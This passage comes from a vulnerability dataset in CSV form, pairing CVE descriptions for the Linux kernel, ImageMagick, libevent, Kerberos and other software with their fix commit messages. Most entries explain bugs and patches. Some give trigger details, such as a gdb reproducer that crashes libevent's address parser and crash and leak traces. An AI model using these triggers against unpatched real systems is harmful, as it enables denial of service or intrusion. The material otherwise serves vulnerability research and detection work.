ffff88022c162ee0) [37598.994008] Stack: [37598.994008]  ffff88022e098a00 ffff88020f973fc0 0000000000000008 00000000000004c8 [37598.994008]  ffff88020f973fc0 00000000000004c4 ffff88003670da78 ffff8801e1b0a200 [37598.994008]  0000000000000018 00000000000004c8 ffff88020f973fc0 00000000000004c4 [37598.994008] Call Trace: [37598.994008]  [<ffffffff815fc21f>] ip6_append_data+0xccf/0xfe0 [37598.994008]  [<ffffffff8158d9f0>] ? ip_copy_metadata+0x1a0/0x1a0 [37598.994008]  [<ffffffff81661f66>] ? _raw_spin_lock_bh+0x16/0x40 [37598.994008]  [<ffffffff8161548d>] udpv6_sendmsg+0x1ed/0xc10 [37598.994008]  [<ffffffff812a2845>] ? sock_has_perm+0x75/0x90 [37598.994008]  [<ffffffff815c3693>] inet_sendmsg+0x63/0xb0 [37598.994008]  [<ffffffff812a2973>] ? selinux_socket_sendmsg+0x23/0x30 [37598.994008]  [<ffffffff8153a450>] sock_sendmsg+0xb0/0xe0 [37598.994008]  [<ffffffff810135d1>] ? __switch_to+0x181/0x4a0 [37598.994008]  [<ffffffff8153d97d>] sys_sendto+0x12d/0x180 [37598.994008]  [<ffffffff810dfb64>] ? __audit_syscall_entry+0x94/0xf0 [37598.994008]  [<ffffffff81020ed1>] ? syscall_trace_enter+0x231/0x240 [37598.994008]  [<ffffffff8166a7e7>] tracesys+0xdd/0xe2 [37598.994008] Code: fe 07 00 00 48 c7 c7 04 28 a6 81 89 45 a0 4c 89 4d b8 44 89 5d a8 e8 1b ac b1 ff 44 8b 5d a8 4c 8b 4d b8 8b 45 a0 e9 cf fe ff ff <0f> 0b 66 0f 1f 84 00 00 00 00 00 66 66 66 66 90 55 48 89 e5 48 [37598.994008] RIP  [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325/0x330 [37598.994008]  RSP <ffff88003670da18> [37599.007323] ---[ end trace d69f6a17f8ac8eee ]---  While there, also check if path mtu discovery is activated for this socket. The logic was adapted from ip6_append_data when first writing on the corked socket.  This bug was introduced with commit 0c18337 (""ipv6: fix incorrect ipsec fragment"").  v2: a) Replace IPV6_PMTU_DISC_DO with IPV6_PMTUDISC_PROBE. b) Don't pass ipv6_pinfo to ip6_append_data_mtu (suggestion by Gao    feng, thanks!). c) Change mtu to unsigned int, else we get a warning about    non-matching types because of the min()-macro type-check.  Acked-by: Gao feng <gaofeng@cn.fujitsu.com> Cc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-7742,CWE-119,2017-04-12,"In libsndfile before 1.0.28, an error in the ""flac_buffer_copy()"" function (flac.c) can be exploited to cause a segmentation violation (with read memory access) via a specially crafted FLAC file during a resample attempt, a similar issue to CVE-2017-7585.",Especially when dealing with corrupt or malicious files.
CVE-2017-13143,CWE-200,2017-08-23,"In ImageMagick before 6.9.7-6 and 7.x before 7.0.4-6, the ReadMATImage function in coders/mat.c uses uninitialized data, which might allow remote attackers to obtain sensitive information from process memory.",
CVE-2017-15951,CWE-20,2017-10-28,"The KEYS subsystem in the Linux kernel before 4.13.10 does not correctly synchronize the actions of updating versus finding a key in the ""negative"" state to avoid a race condition, which allows local users to cause a denial of service or possibly have unspecified other impact via crafted system calls.","Consolidate KEY_FLAG_INSTANTIATED, KEY_FLAG_NEGATIVE and the rejection error into one field such that:   (1) The instantiation state can be modified/read atomically.   (2) The error can be accessed atomically with the state.   (3) The error isn't stored unioned with the payload pointers.  This deals with the problem that the state is spread over three different objects (two bits and a separate variable) and reading or updating them atomically isn't practical, given that not only can uninstantiated keys change into instantiated or rejected keys, but rejected keys can also turn into instantiated keys - and someone accessing the key might not be using any locking.  The main side effect of this problem is that what was held in the payload may change, depending on the state.  For instance, you might observe the key to be in the rejected state.  You then read the cached error, but if the key semaphore wasn't locked, the key might've become instantiated between the two reads - and you might now have something in hand that isn't actually an error code.  The state is now KEY_IS_UNINSTANTIATED, KEY_IS_POSITIVE or a negative error code if the key is negatively instantiated.  The key_is_instantiated() function is replaced with key_is_positive() to avoid confusion as negative keys are also 'instantiated'.  Additionally, barriering is included:   (1) Order payload-set before state-set during instantiation.   (2) Order state-read before payload-read when using the key.  Further separate barriering is necessary if RCU is being used to access the payload content after reading the payload pointers.  Fixes: 146aa8b (""KEYS: Merge the type-specific data with the payload data"") Cc: stable@vger.kernel.org # v4.4+ Reported-by: Eric Biggers <ebiggers@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Reviewed-by: Eric Biggers <ebiggers@google.com>"
CVE-2016-10196,CWE-787,2017-03-15,Stack-based buffer overflow in the evutil_parse_sockaddr_port function in evutil.c in libevent before 2.1.6-beta allows attackers to cause a denial of service (segmentation fault) via vectors involving a long string in brackets in the ip_as_string argument.,"@asn-the-goblin-slayer:   ""Length between '[' and ']' is cast to signed 32 bit integer on line 1815. Is    the length is more than 2<<31 (INT_MAX), len will hold a negative value.    Consequently, it will pass the check at line 1816. Segfault happens at line    1819.     Generate a resolv.conf with generate-resolv.conf, then compile and run    poc.c. See entry-functions.txt for functions in tor that might be    vulnerable.     Please credit 'Guido Vranken' for this discovery through the Tor bug bounty    program.""  Reproducer for gdb (https://gist.github.com/azat/be2b0d5e9417ba0dfe2c):   start   p (1ULL<<31)+1ULL   # $1 = 2147483649   p malloc(sizeof(struct sockaddr))   # $2 = (void *) 0x646010   p malloc(sizeof(int))   # $3 = (void *) 0x646030   p malloc($1)   # $4 = (void *) 0x7fff76a2a010   p memset($4, 1, $1)   # $5 = 1990369296   p (char *)$4   # $6 = 0x7fff76a2a010 '\001' <repeats 200 times>...   set $6[0]='['   set $6[$1]=']'   p evutil_parse_sockaddr_port($4, $2, $3)   # $7 = -1  Before:   $ gdb bin/http-connect < gdb   (gdb) $1 = 2147483649   (gdb) (gdb) $2 = (void *) 0x646010   (gdb) (gdb) $3 = (void *) 0x646030   (gdb) (gdb) $4 = (void *) 0x7fff76a2a010   (gdb) (gdb) $5 = 1990369296   (gdb) (gdb) $6 = 0x7fff76a2a010 '\001' <repeats 200 times>...   (gdb) (gdb) (gdb) (gdb)   Program received signal SIGSEGV, Segmentation fault.   __memcpy_sse2_unaligned () at memcpy-sse2-unaligned.S:36  After:   $ gdb bin/http-connect < gdb   (gdb) $1 = 2147483649   (gdb) (gdb) $2 = (void *) 0x646010   (gdb) (gdb) $3 = (void *) 0x646030   (gdb) (gdb) $4 = (void *) 0x7fff76a2a010   (gdb) (gdb) $5 = 1990369296   (gdb) (gdb) $6 = 0x7fff76a2a010 '\001' <repeats 200 times>...   (gdb) (gdb) (gdb) (gdb) $7 = -1   (gdb) (gdb) quit  Fixes: #318"
CVE-2011-2724,CWE-20,2011-09-06,"The check_mtab function in client/mount.cifs.c in mount.cifs in smbfs in Samba 3.5.10 and earlier does not properly verify that the (1) device name and (2) mountpoint strings are composed of valid characters, which allows local users to cause a denial of service (mtab corruption) via a crafted string.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2010-0547.",
CVE-2015-2694,CWE-264,2015-05-25,"The kdcpreauth modules in MIT Kerberos 5 (aka krb5) 1.12.x and 1.13.x before 1.13.2 do not properly track whether a client's request has been validated, which allows remote attackers to bypass an intended preauthentication requirement by providing (1) zero bytes of data or (2) an arbitrary realm name, related to plugins/preauth/otp/main.c and plugins/preauth/pkinit/pkinit_srv.c.","In the OTP kdcpreauth module, don't set the TKT_FLG_PRE_AUTH bit until the request is successfully verified.  In the PKINIT kdcpreauth module, don't respond with code 0 on empty input or an unconfigured realm.  Together these bugs could cause the KDC preauth framework to erroneously treat a request as pre-authenticated.  CVE-2015-2694:  In MIT krb5 1.12 and later, when the KDC is configured with PKINIT support, an unauthenticated remote attacker can bypass the requires_preauth flag on a client principal and obtain a ciphertext encrypted in the principal's long-term key.  This ciphertext could be used to conduct an off-line dictionary attack against the user's password.      CVSSv2 Vector: AV:N/AC:M/Au:N/C:P/I:P/A:N/E:POC/RL:OF/RC:C  ticket: 8160 (new) target_version: 1.13.2 tags: pullup subject: requires_preauth bypass in PKINIT-enabled KDC [CVE-2015-2694]"
CVE-2016-2550,CWE-399,2016-04-27,The Linux kernel before 4.5 allows local users to bypass file-descriptor limits and cause a denial of service (memory consumption) by leveraging incorrect tracking of descriptor ownership and sending each descriptor over a UNIX socket before closing it. NOTE: this vulnerability exists because of an incorrect fix for CVE-2013-4312.,"The commit referenced in the Fixes tag incorrectly accounted the number of in-flight fds over a unix domain socket to the original opener of the file-descriptor. This allows another process to arbitrary deplete the original file-openers resource limit for the maximum of open files. Instead the sending processes and its struct cred should be credited.  To do so, we add a reference counted struct user_struct pointer to the scm_fp_list and use it to account for the number of inflight unix fds.  Fixes: 712f4aa (""unix: properly account for FDs passed over unix sockets"") Reported-by: David Herrmann <dh.herrmann@gmail.com> Cc: David Herrmann <dh.herrmann@gmail.com> Cc: Willy Tarreau <w@1wt.eu> Cc: Linus Torvalds <torvalds@linux-foundation.org> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10067,CWE-119,2017-03-02,"magick/memory.c in ImageMagick before 6.9.4-5 allows remote attackers to cause a denial of service (application crash) via vectors involving ""too many exceptions,"" which trigger a buffer overflow.",
CVE-2014-0069,CWE-119,2014-02-28,"The cifs_iovec_write function in fs/cifs/file.c in the Linux kernel through 3.13.5 does not properly handle uncached write operations that copy fewer than the requested number of bytes, which allows local users to obtain sensitive information from kernel memory, cause a denial of service (memory corruption and system crash), or possibly gain privileges via a writev system call with a crafted pointer.","It's possible for userland to pass down an iovec via writev() that has a bogus user pointer in it. If that happens and we're doing an uncached write, then we can end up getting less bytes than we expect from the call to iov_iter_copy_from_user. This is CVE-2014-0069  cifs_iovec_write isn't set up to handle that situation however. It'll blindly keep chugging through the page array and not filling those pages with anything useful. Worse yet, we'll later end up with a negative number in wdata->tailsz, which will confuse the sending routines and cause an oops at the very least.  Fix this by having the copy phase of cifs_iovec_write stop copying data in this situation and send the last write as a short one. At the same time, we want to avoid sending a zero-length write to the server, so break out of the loop and set rc to -EFAULT if that happens. This also allows us to handle the case where no address in the iovec is valid.  [Note: Marking this for stable on v3.4+ kernels, but kernels as old as        v2.6.38 may have a similar problem and may need similar fix]  Cc: <stable@vger.kernel.org> # v3.4+ Reviewed-by: Pavel Shilovsky <piastry@etersoft.ru> Reported-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>"
CVE-2018-17182,CWE-416,2018-09-19,"An issue was discovered in the Linux kernel through 4.18.8. The vmacache_flush_all function in mm/vmacache.c mishandles sequence number overflows. An attacker can trigger a use-after-free (and possibly gain privileges) via certain thread creation, map, unmap, invalidation, and dereference operations.","Jann Horn points out that the vmacache_flush_all() function is not only potentially expensive, it's buggy too.  It also happens to be entirely unnecessary, because the sequence number overflow case can be avoided by simply making the sequence number be 64-bit.  That doesn't even grow the data structures in question, because the other adjacent fields are already 64-bit.  So simplify the whole thing by just making the sequence number overflow case go away entirely, which gets rid of all the complications and makes the code faster too.  Win-win.  [ Oleg Nesterov points out that the VMACACHE_FULL_FLUSHES statistics   also just goes away entirely with this ]  Reported-by: Jann Horn <jannh@google.com> Suggested-by: Will Deacon <will.deacon@arm.com> Acked-by: Davidlohr Bueso <dave@stgolabs.net> Cc: Oleg Nesterov <oleg@redhat.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-5546,,2017-02-06,The freelist-randomization feature in mm/slab.c in the Linux kernel 4.8.x and 4.9.x before 4.9.5 allows local users to cause a denial of service (duplicate freelist entries and system crash) or possibly have unspecified other impact in opportunistic circumstances by leveraging the selection of a large value for a random number.,"This patch fixes a bug in the freelist randomization code.  When a high random number is used, the freelist will contain duplicate entries.  It will result in different allocations sharing the same chunk.  It will result in odd behaviours and crashes.  It should be uncommon but it depends on the machines.  We saw it happening more often on some machines (every few hours of running tests).  Fixes: c7ce4f6 (""mm: SLAB freelist randomization"") Link: http://lkml.kernel.org/r/20170103181908.143178-1-thgarnie@google.com Signed-off-by: John Sperbeck <jsperbeck@google.com> Signed-off-by: Thomas Garnier <thgarnie@google.com> Cc: Christoph Lameter <cl@linux.com> Cc: Pekka Enberg <penberg@kernel.org> Cc: David Rientjes <rientjes@google.com> Cc: Joonsoo Kim <iamjoonsoo.kim@lge.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-12588,CWE-134,2017-08-06,"The zmq3 input and output modules in rsyslog before 8.28.0 interpreted description fields as format strings, possibly allowing a format string attack with unspecified impact.",Fix format security issue in zmq3 modules
CVE-2014-1444,CWE-399,2014-01-18,"The fst_get_iface function in drivers/net/wan/farsync.c in the Linux kernel before 3.11.7 does not properly initialize a certain data structure, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability for an SIOCWANDEV ioctl call.",The fst_get_iface() code fails to initialize the two padding bytes of struct sync_serial_settings after the ->loopback member. Add an explicit memset(0) before filling the structure to avoid the info leak.  Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2014-2270,CWE-119,2014-03-14,softmagic.c in file before 5.17 and libmagic allows context-dependent attackers to cause a denial of service (out-of-bounds memory access and crash) via crafted offsets in the softmagic of a PE executable.,
CVE-2012-6657,CWE-264,2014-09-28,"The sock_setsockopt function in net/core/sock.c in the Linux kernel before 3.5.7 does not ensure that a keepalive action is associated with a stream socket, which allows local users to cause a denial of service (system crash) by leveraging the ability to create a raw socket.",Its possible to use RAW sockets to get a crash in tcp_set_keepalive() / sk_reset_timer()  Fix is to make sure socket is a SOCK_STREAM one.  Reported-by: Dave Jones <davej@redhat.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2017-5225,CWE-119,2017-01-12,LibTIFF version 4.0.7 is vulnerable to a heap buffer overflow in the tools/tiffcp resulting in DoS or code execution via a crafted BitsPerSample value.,cpSeparate2ContigByRow if BitsPerSample != 8 to avoid heap based overflow. Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2656 and http://bugzilla.maptools.org/show_bug.cgi?id=2657
CVE-2015-7566,,2016-02-08,The clie_5_attach function in drivers/usb/serial/visor.c in the Linux kernel through 4.4.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by inserting a USB device that lacks a bulk-out endpoint.,"The visor driver crashes in clie_5_attach() when a specially crafted USB device without bulk-out endpoint is detected. This fix adds a check that the device has proper configuration expected by the driver.  Reported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Fixes: cfb8da8 (""USB: visor: fix initialisation of UX50/TH55 devices"") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org>"
CVE-2013-6368,CWE-20,2013-12-14,The KVM subsystem in the Linux kernel through 3.12.5 allows local users to gain privileges or cause a denial of service (system crash) via a VAPIC synchronization operation involving a page-end address.,"In kvm_lapic_sync_from_vapic and kvm_lapic_sync_to_vapic there is the potential to corrupt kernel memory if userspace provides an address that is at the end of a page.  This patches concerts those functions to use kvm_write_guest_cached and kvm_read_guest_cached.  It also checks the vapic_address specified by userspace during ioctl processing and returns an error to userspace if the address is not a valid GPA.  This is generally not guest triggerable, because the required write is done by firmware that runs before the guest.  Also, it only affects AMD processors and oldish Intel that do not have the FlexPriority feature (unless you disable FlexPriority, of course; then newer processors are also affected).  Fixes: b93463a ('KVM: Accelerated apic support')  Reported-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2018-19045,CWE-200,2018-11-08,"keepalived 2.0.8 used mode 0666 when creating new temporary files upon a call to PrintData or PrintStats, potentially leaking sensitive information.","Commit c6247a9 - ""Add command line and configuration option to set umask"" introduced a compile warning, although the code would have worked OK.  Signed-off-by: Quentin Armitage <quentin@armitage.org.uk>"
CVE-2013-1428,CWE-119,2013-04-26,Stack-based buffer overflow in the receive_tcppacket function in net_packet.c in tinc before 1.0.21 and 1.1 before 1.1pre7 allows remote authenticated peers to cause a denial of service (crash) or possibly execute arbitrary code via a large TCP packet.,"Normally all requests sent via the meta connections are checked so that they cannot be larger than the input buffer. However, when packets are forwarded via meta connections, they are copied into a packet buffer without checking whether it fits into it. Since the packet buffer is allocated on the stack, this in effect allows an authenticated remote node to cause a stack overflow.  This issue was found by Martin Schobert."
CVE-2013-3224,CWE-200,2013-04-22,"The bt_sock_recvmsg function in net/bluetooth/af_bluetooth.c in the Linux kernel before 3.9-rc7 does not properly initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","In case the socket is already shutting down, bt_sock_recvmsg() returns with 0 without updating msg_namelen leading to net/socket.c leaking the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.  Fix this by moving the msg_namelen assignment in front of the shutdown test.  Cc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-8026,CWE-119,2017-03-27,Heap-based buffer overflow in the verify_vbr_checksum function in exfatfsck in exfat-utils before 1.2.1 allows remote attackers to cause a denial of service (infinite loop) or possibly execute arbitrary code via a crafted filesystem.,Otherwise malformed FS can cause heap corruption.
CVE-2011-4098,CWE-119,2013-06-08,"The fallocate implementation in the GFS2 filesystem in the Linux kernel before 3.2 relies on the page cache, which might allow local users to cause a denial of service by preallocating blocks in certain situations involving insufficient memory.","GFS2's fallocate code currently goes through the page cache. Since it's only writing to the end of the file or to holes in it, it doesn't need to, and it was causing issues on low memory environments. This patch pulls in some of Steve's block allocation work, and uses it to simply allocate the blocks for the file, and zero them out at allocation time.  It provides a slight performance increase, and it dramatically simplifies the code.  Signed-off-by: Benjamin Marzinski <bmarzins@redhat.com> Signed-off-by: Steven Whitehouse <swhiteho@redhat.com>"
CVE-2017-12664,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WritePALMImage in coders/palm.c.,
CVE-2012-6545,CWE-200,2013-03-15,"The Bluetooth RFCOMM implementation in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel memory via a crafted application.",The RFCOMM code fails to initialize the two padding bytes of struct rfcomm_dev_list_req inserted for alignment before copying it to userland. Additionally there are two padding bytes in each instance of struct rfcomm_dev_info. The ioctl() that for disclosures two bytes plus dev_num times two bytes uninitialized kernel heap memory.  Allocate the memory using kzalloc() to fix this issue.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2016-8692,CWE-369,2017-02-15,The jpc_dec_process_siz function in libjasper/jpc/jpc_dec.c in JasPer before 1.900.4 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted YRsiz value in a BMP image to the imginfo command.,
CVE-2018-20145,CWE-732,2018-12-13,"Eclipse Mosquitto 1.5.x before 1.5.5 allows ACL bypass: if the option per_listener_settings was set to true, and the default listener was in use, and the default listener specified an acl_file, then the acl file was being ignored.",Close #1073. Thanks to Jef Driesen.  Bug: #1073
CVE-2017-11176,CWE-416,2017-07-11,"The mq_notify function in the Linux kernel through 4.11.9 does not set the sock pointer to NULL upon entry into the retry logic. During a user-space close of a Netlink socket, it allows attackers to cause a denial of service (use-after-free) or possibly have unspecified other impact.",
CVE-2017-13017,CWE-125,2017-09-14,The DHCPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-dhcp6.c:dhcp6opt_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2019-12210,,2019-06-04,"In Yubico pam-u2f 1.0.7, when configured with debug and a custom debug log file is set using debug_file, that file descriptor is not closed when a new process is spawned. This leads to the file descriptor being inherited into the child process; the child process can then read from and write to it. This can leak sensitive information and also, if written to, be used to fill the disk or plant misinformation.","When opening a custom debug file, the descriptor would stay open when calling exec and leak to the child process.  Make sure all files are opened with close-on-exec.  This fixes CVE-2019-12210.  Thanks to Matthias Gerstner of the SUSE Security Team for reporting the issue."
CVE-2018-5333,CWE-476,2018-01-11,"In the Linux kernel through 4.14.13, the rds_cmsg_atomic function in net/rds/rdma.c mishandles cases where page pinning fails or an invalid address is supplied, leading to an rds_atomic_free_op NULL pointer dereference.","set rm->atomic.op_active to 0 when rds_pin_pages() fails or the user supplied address is invalid, this prevents a NULL pointer usage in rds_atomic_free_op()  Signed-off-by: Mohamed Ghannam <simo.ghannam@gmail.com> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-0914,CWE-264,2013-03-22,"The flush_signal_handlers function in kernel/signal.c in the Linux kernel before 3.8.4 preserves the value of the sa_restorer field across an exec operation, which makes it easier for local users to bypass the ASLR protection mechanism via a crafted application containing a sigaction system call.","When the new signal handlers are set up, the location of sa_restorer is not cleared, leaking a parent process's address space location to children.  This allows for a potential bypass of the parent's ASLR by examining the sa_restorer value returned when calling sigaction().  Based on what should be considered ""secret"" about addresses, it only matters across the exec not the fork (since the VMAs haven't changed until the exec).  But since exec sets SIG_DFL and keeps sa_restorer, this is where it should be fixed.  Given the few uses of sa_restorer, a ""set"" function was not written since this would be the only use.  Instead, we use __ARCH_HAS_SA_RESTORER, as already done in other places.  Example of the leak before applying this patch:    $ cat /proc/$$/maps   ...   7fb9f3083000-7fb9f3238000 r-xp 00000000 fd:01 404469 .../libc-2.15.so   ...   $ ./leak   ...   7f278bc74000-7f278be29000 r-xp 00000000 fd:01 404469 .../libc-2.15.so   ...   1 0 (nil) 0x7fb9f30b94a0   2 4000000 (nil) 0x7f278bcaa4a0   3 4000000 (nil) 0x7f278bcaa4a0   4 0 (nil) 0x7fb9f30b94a0   ...  [akpm@linux-foundation.org: use SA_RESTORER for backportability] Signed-off-by: Kees Cook <keescook@chromium.org> Reported-by: Emese Revfy <re.emese@gmail.com> Cc: Emese Revfy <re.emese@gmail.com> Cc: PaX Team <pageexec@freemail.hu> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Oleg Nesterov <oleg@redhat.com> Cc: ""Eric W. Biederman"" <ebiederm@xmission.com> Cc: Serge Hallyn <serge.hallyn@canonical.com> Cc: Julien Tinnes <jln@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-5207,CWE-269,2017-03-23,"Firejail before 0.9.44.4, when running a bandwidth command, allows local users to gain root privileges via the --shell argument.",
CVE-2015-6817,CWE-287,2017-05-23,"PgBouncer 1.6.x before 1.6.1, when configured with auth_user, allows remote attackers to gain login access as auth_user via an unknown username.","When query returns 0 rows (user not found), this user stays as login user...  Should fix #69."
CVE-2016-10057,CWE-119,2017-03-23,Buffer overflow in the WriteGROUP4Image function in coders/tiff.c in ImageMagick before 6.9.5-8 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.,
CVE-2011-2821,CWE-415,2011-08-29,"Double free vulnerability in libxml2, as used in Google Chrome before 13.0.782.215, allows remote attackers to cause a denial of service or possibly have unspecified other impact via a crafted XPath expression.",
CVE-2016-10517,CWE-254,2017-10-24,"networking.c in Redis before 3.2.7 allows ""Cross Protocol Scripting"" because it lacks a check for POST and Host: strings, which are not valid in the Redis protocol (but commonly occur when an attack triggers an HTTP request to the Redis TCP port).","This is an attempt at mitigating problems due to cross protocol scripting, an attack targeting services using line oriented protocols like Redis that can accept HTTP requests as valid protocol, by discarding the invalid parts and accepting the payloads sent, for example, via a POST request.  For this to be effective, when we detect POST and Host: and terminate the connection asynchronously, the networking code was modified in order to never process further input. It was later verified that in a pipelined request containing a POST command, the successive commands are not executed."
CVE-2018-9336,CWE-415,2018-05-01,openvpnserv.exe (aka the interactive service helper) in OpenVPN 2.4.x before 2.4.6 allows a local attacker to cause a double-free of memory by sending a malformed request to the interactive service. This could cause a denial-of-service through memory corruption or possibly have unspecified other impact including privilege escalation.,"Malformed input data on the service pipe towards the OpenVPN interactive service (normally used by the OpenVPN GUI to request openvpn instances from the service) can result in a double free() in the error handling code.  This usually only leads to a process crash (DoS by an unprivileged local account) but since it could possibly lead to memory corruption if happening while multiple other threads are active at the same time, CVE-2018-9336 has been assigned to acknowledge this risk.  Fix by ensuring that sud->directory is set to NULL in GetStartUpData() for all error cases (thus not being free()ed in FreeStartupData()).  Rewrite control flow to use explicit error label for error exit.  Discovered and reported by Jacob Baines <jbaines@tenable.com>.  CVE: 2018-9336  Signed-off-by: Gert Doering <gert@greenie.muc.de> Acked-by: Selva Nair <selva.nair@gmail.com> Message-Id: <20180414072617.25075-1-gert@greenie.muc.de> URL: https://www.mail-archive.com/search?l=mid&q=20180414072617.25075-1-gert@greenie.muc.de  Signed-off-by: Gert Doering <gert@greenie.muc.de>"
CVE-2017-7487,CWE-416,2017-05-14,"The ipxitf_ioctl function in net/ipx/af_ipx.c in the Linux kernel through 4.11.1 mishandles reference counts, which allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a failed SIOCGIFADDR ioctl call for an IPX interface.",We should call ipxitf_put() if the copy_to_user() fails.  Reported-by: 李强 <liqiang6-s@360.cn> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2019-13045,CWE-416,2019-06-29,"Irssi before 1.0.8, 1.1.x before 1.1.3, and 1.2.x before 1.2.1, when SASL is enabled, has a use after free when sending SASL login to the server.",copy sasl username and password values
CVE-2016-8670,CWE-119,2017-01-04,"Integer signedness error in the dynamicGetbuf function in gd_io_dp.c in the GD Graphics Library (aka libgd) through 2.2.3, as used in PHP before 5.6.28 and 7.x before 7.0.13, allows remote attackers to cause a denial of service (stack-based buffer overflow) or possibly have unspecified other impact via a crafted imagecreatefromstring call.",We make sure to never pass a negative `rlen` as size to memcpy(). See also <https://bugs.php.net/bug.php?id=73280>.  Patch provided by Emmanuel Law.
CVE-2013-1848,CWE-20,2013-03-22,"fs/ext3/super.c in the Linux kernel before 3.8.4 uses incorrect arguments to functions in certain circumstances related to printk input, which allows local users to conduct format-string attacks and possibly gain privileges via a crafted application.","ext3_msg() takes the printk prefix as the second parameter and the format string as the third parameter. Two callers of ext3_msg omit the prefix and pass the format string as the second parameter and the first parameter to the format string as the third parameter. In both cases this string comes from an arbitrary source. Which means the string may contain format string characters, which will lead to undefined and potentially harmful behavior.  The issue was introduced in commit 4cf46b6(""ext3: Unify log messages in ext3"") and is fixed by this patch.  CC: stable@vger.kernel.org Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Signed-off-by: Jan Kara <jack@suse.cz>"
CVE-2016-7145,CWE-287,2017-03-07,The m_authenticate function in ircd/m_authenticate.c in nefarious2 allows remote attackers to spoof certificate fingerprints and consequently log in as another user via a crafted AUTHENTICATE parameter.,
CVE-2018-15501,CWE-125,2018-08-18,"In ng_pkt in transports/smart_pkt.c in libgit2 before 0.26.6 and 0.27.x before 0.27.4, a remote attacker can send a crafted smart-protocol ""ng"" packet that lacks a '\0' byte to trigger an out-of-bounds read that leads to DoS.","OSS-fuzz has reported a potential out-of-bounds read when processing a ""ng"" smart packet:  ==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6310000249c0 at pc 0x000000493a92 bp 0x7ffddc882cd0 sp 0x7ffddc882480 	READ of size 65529 at 0x6310000249c0 thread T0 	SCARINESS: 26 (multi-byte-read-heap-buffer-overflow) 	#0 0x493a91 in __interceptor_strchr.part.35 /src/llvm/projects/compiler-rt/lib/sanitizer_common/sanitizer_common_interceptors.inc:673 	#1 0x813960 in ng_pkt libgit2/src/transports/smart_pkt.c:320:14 	#2 0x810f79 in git_pkt_parse_line libgit2/src/transports/smart_pkt.c:478:9 	#3 0x82c3c9 in git_smart__store_refs libgit2/src/transports/smart_protocol.c:47:12 	#4 0x6373a2 in git_smart__connect libgit2/src/transports/smart.c:251:15 	#5 0x57688f in git_remote_connect libgit2/src/remote.c:708:15 	#6 0x52e59b in LLVMFuzzerTestOneInput /src/download_refs_fuzzer.cc:145:9 	#7 0x52ef3f in ExecuteFilesOnyByOne(int, char**) /src/libfuzzer/afl/afl_driver.cpp:301:5 	#8 0x52f4ee in main /src/libfuzzer/afl/afl_driver.cpp:339:12 	#9 0x7f6c910db82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/libc-start.c:291 	#10 0x41d518 in _start  When parsing an ""ng"" packet, we keep track of both the current position as well as the remaining length of the packet itself. But instead of taking care not to exceed the length, we pass the current pointer's position to `strchr`, which will search for a certain character until hitting NUL. It is thus possible to create a crafted packet which doesn't contain a NUL byte to trigger an out-of-bounds read.  Fix the issue by instead using `memchr`, passing the remaining length as restriction. Furthermore, verify that we actually have enough bytes left to produce a match at all.  OSS-Fuzz-Issue: 9406"
